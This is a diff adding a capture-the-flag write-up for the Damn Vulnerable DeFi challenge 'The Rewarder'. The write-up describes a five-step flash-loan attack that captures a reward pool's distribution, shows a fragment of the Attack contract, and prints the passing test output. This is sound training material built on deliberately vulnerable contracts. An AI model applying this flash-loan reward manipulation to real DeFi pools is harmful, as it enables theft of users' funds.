@@ -1,3 +1,52 @@
+# Damn Vulnerable DeFi (Foundry version)
+
+- [Scope](#scope)
+- [Plan](#plan)
+- [Solution](#solution)
+  - [Proof of Concept](#proof-of-concept)
+
+## Challenge #5 - The rewarder - Description
+
+There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.
+
+Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!
+
+You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.
+
+Oh, by the way, rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans?
+
+## Scope
+
+| File Name                                                                   | SHA-1 Hash                               |
+| --------------------------------------------------------------------------- | ---------------------------------------- |
+| damn-vulnerable-defi-foundry/src/Contracts/the-rewarder/AccountingToken.sol | 5cc4fc8b8a94843f2b1be925745213c3cd9e7ff5 |
+| damn-vulnerable-defi-foundry/src/Contracts/the-rewarder/FlashLoanerPool.sol | a1651046810d5419b9a2f16aab6d3cb8034e9a29 |
+| damn-vulnerable-defi-foundry/src/Contracts/the-rewarder/RewardToken.sol     | b679fb4633357d6f762374af9bce554076ac57a1 |
+| damn-vulnerable-defi-foundry/src/Contracts/the-rewarder/TheRewarderPool.sol | 20bc3fb225e1fe7e67f74521a4ea01d4956472ac |
+
+## Plan
+
+The description contains already a hint. Most probably we will have to take a flash loan after the current round and claim most/all the rewards for us.
+
+## Solution
+
+<details>
+    <summary>Description</summary>
+
+In function `flashLoan()` of `FlashLoanerPool` there is a check that the [borrower must be a contract](https://github.com/cRat1st0s/damn-vulnerable-defi-foundry/blob/b1b61dfe28cbdd8a7f4d3b3e1b73cf2963afc750/src/Contracts/the-rewarder/FlashLoanerPool.sol#L29) and we will have to implement our own [receiveFlashLoan](https://github.com/cRat1st0s/damn-vulnerable-defi-foundry/blob/b1b61dfe28cbdd8a7f4d3b3e1b73cf2963afc750/src/Contracts/the-rewarder/FlashLoanerPool.sol#L33).
+
+1.  We fast-forward 5 days.
+2.  Call `flashLoan` with `TOKENS_IN_LENDER_POOL` from our `Attack` contract.
+3.  `deposit` to `theRewarderPool` to trigger also the `distributeRewards`.
+4.  `withdraw` to pay back the loan as we have already claimed our rewards.
+5.  `transfer` the rewards to us.
+
+</details>
+
+<details>
+    <summary>damn-vulnerable-defi-foundry/test/Levels/the-rewarder/TheRewarder.t.sol</summary>
+
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity >=0.8.0;
 
@@ -155,3 +204,25 @@ contract Attack {
         flashLoanerPool.flashLoan(TOKENS_IN_LENDER_POOL);
     }
 }
+```
+
+</details>
+
+### Proof of Concept
+
+```
+./run.sh 5
+[⠢] Compiling...
+[⠰] Compiling 1 files with 0.8.17
+[⠔] Solc 0.8.17 finished in 1.10s
+Compiler run successful (with warnings)
+
+Running 1 test for test/Levels/the-rewarder/TheRewarder.t.sol:TheRewarder
+[PASS] testExploit() (gas: 911018)
+Logs:
+  🧨 Let's see if you can break it... 🧨
+
+🎉 Congratulations, you can go to the next level! 🎉
+
+Test result: ok. 1 passed; 0 failed; finished in 2.39ms
+```
